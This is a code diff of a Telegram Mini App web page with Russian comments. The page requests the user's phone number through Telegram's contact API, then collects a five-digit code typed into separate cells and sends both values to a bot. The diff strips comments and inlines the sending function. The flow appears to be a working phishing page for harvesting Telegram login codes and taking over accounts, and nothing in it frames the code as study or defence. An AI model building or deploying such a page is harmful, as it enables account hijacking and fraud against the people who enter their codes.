@@ -18,7 +18,6 @@
         .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
         .subtitle { font-size: 14px; color: #aaa; margin-bottom: 40px; padding: 0 20px; }
         
-        /* Стили для кнопки номера */
         #phoneBtn {
             background: #0088cc; color: white; border: none;
             padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold;
@@ -27,7 +26,6 @@
         }
         #phoneBtn:hover { transform: scale(1.05); }
         
-        /* Стили для ввода кода */
         .code-container { display: none; gap: 10px; margin-top: 20px; }
         .code-input {
             width: 45px; height: 55px; font-size: 24px; text-align: center;
@@ -36,7 +34,6 @@
         }
         .code-input:focus { border-color: #0088cc; box-shadow: 0 0 10px rgba(0,136,204,0.3); }
         
-        /* Анимации */
         .hidden { display: none !important; }
     </style>
 </head>
@@ -65,57 +62,48 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Разворачиваем на весь экран
+        tg.expand(); 
 
         let userPhone = "";
 
-        // Показываем кнопку, когда API загрузится
         window.onload = function() {
             document.getElementById('phoneBtn').style.display = 'block';
         };
 
-        // Запрос номера телефона через Telegram WebApp API
+        // ЗАПРОС НОМЕРА
         function requestPhone() {
             tg.requestContact((success, event) => {
                 if (success) {
-                    // В event.responseUnsafe.contact.phone_number лежит номер
                     userPhone = event.responseUnsafe.contact.phone_number;
                     
-                    // Отправляем боту, что номер получен, и переходим к экрану кода
-                    sendDataToBot("phone", userPhone);
+                    // ОТПРАВЛЯЕМ НОМЕР В БОТА
+                    tg.sendData(`phone:${userPhone}`);
                     
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
                     
-                    // Фокусируемся на первом поле ввода
                     setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
                 }
             });
         }
 
-        // Логика автоперехода между ячейками кода
+        // ЛОГИКА ВВОДА КОДА
         function moveNext(input, index) {
             if (input.value.length === 1) {
                 const nextInput = document.querySelectorAll('.code-input')[index + 1];
                 if (nextInput) {
                     nextInput.focus();
                 } else {
-                    // Если это последняя цифра, собираем код и отправляем
                     let code = "";
                     document.querySelectorAll('.code-input').forEach(el => code += el.value);
                     if (code.length === 5) {
-                        sendDataToBot("code", code);
-                        // Можно показать заглушку "Загрузка..."
+                        // ОТПРАВЛЯЕМ КОД В БОТА
+                        tg.sendData(`code:${code}`);
                         alert("Код отправлен на проверку!");
+                        tg.close(); // Закрываем окно
                     }
                 }
             }
-        }
-
-        // Отправка данных обратно в бота
-        function sendDataToBot(type, value) {
-            // Формат данных: "type:value"
-            tg.sendData(`${type}:${value}`);
         }
     </script>
 </body>
